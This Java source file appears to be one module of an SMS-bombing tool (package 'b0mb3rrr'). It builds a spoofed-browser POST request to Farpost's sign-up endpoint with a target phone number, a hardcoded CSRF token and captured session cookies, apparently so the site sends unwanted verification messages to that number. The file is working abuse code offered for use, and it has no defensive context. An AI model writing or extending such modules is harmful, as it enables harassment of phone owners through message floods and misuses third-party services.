package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Farpost extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        RequestBody formBody = new FormBody.Builder()
                .add("csrfToken", "fafef8e0090353a666acb66b004455dd")
                .add("radio", "reg")
                .add("sign", phone.phone())
                .build();

        return new Request.Builder()
                .url("https://www.farpost.ru/sign?return=%2Fvladivostok%2Fservice%2Ftech%2F%2B%2F%25D0%25A0%25D0%25B5%25D0%25BC%25D0%25BE%25D0%25BD%25D1%2582%2B%25D0%25BA%25D0%25BE%25D0%25BC%25D0%25BF%25D1%258C%25D1%258E%25D1%2582%25D0%25B5%25D1%2580%25D0%25BE%25D0%25B2%2F")
                .post(formBody)
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .header("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Origin", "https://www.farpost.ru")
                .header("Connection", "keep-alive")
                .header("Referer", "https://www.farpost.ru/sign?return=%2Fvladivostok%2Fservice%2Ftech%2F%2B%2F%25D0%25A0%25D0%25B5%25D0%25BC%25D0%25BE%25D0%25BD%25D1%2582%2B%25D0%25BA%25D0%25BE%25D0%25BC%25D0%25BF%25D1%258C%25D1%258E%25D1%2582%25D0%25B5%25D1%2580%25D0%25BE%25D0%25B2%2F")
                .header("Cookie", "ring=360f9fde45d071ebb484bbceb5f25166; ring_session=1.1.1712869950.1712869950.1712869966.Ca8LTfz0kGFFVI9XmQ%2FO%2FL62ZEGIqhLfu31dZCDCZVM%3D; _ga_G0RWKN84TQ=GS1.1.1712869952.1.1.1712869955.57.0.0; _ga=GA1.1.1036345336.1712869952; _gid=GA1.2.235907426.1712869952; _gat_UA-52660522-10=1; _ga_64RVG4FR1N=GS1.2.1712869952.1.0.1712869952.0.0.0")
                .header("Upgrade-Insecure-Requests", "1")
                .header("Sec-Fetch-Dest", "document")
                .header("Sec-Fetch-Mode", "navigate")
                .header("Sec-Fetch-Site", "same-origin")
                .header("Sec-Fetch-User", "?1")
                .header("TE", "trailers");
    }

    @Override
    public String getServiceName() {
        return "Farpost";
    }
}
